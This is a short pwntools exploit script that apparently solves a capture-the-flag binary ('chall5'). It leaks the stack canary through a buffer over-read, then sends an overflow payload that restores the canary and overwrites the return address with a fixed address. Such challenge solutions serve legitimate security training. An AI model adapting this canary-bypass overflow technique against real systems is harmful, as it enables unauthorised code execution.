from pwn import *

addr = p32(0x80486a6)
stack_size = 1024
buf_size = 500
junk_size = 4 + 1 # taille du canary manuel + le premier caractère du canary (on sait qu'il commence par 0x00)

payload_overread = b'A' * (buf_size + junk_size)

payload = b'A' * stack_size + 10 * b'A'

proc = process('./chall5')
proc.sendlineafter(b":", payload_overread)

# 19 = A password for ....
# buf_size + junk_size = provided username
# 3 = remaining canary length
canary = b'\x00' + proc.recvall(timeout=2)[19+505:19+505+3]
proc.close()

print("CANARY:", canary)

offset_canary = 1008 # password + 4 + username + 4

payload = b'A' * offset_canary + canary + (stack_size - len(canary) - offset_canary) * b'A' + addr

proc = process('./chall5')
proc.sendlineafter(b':', b"username")
proc.sendlineafter(b':', payload)
print(proc.recvall(timeout=2).decode())
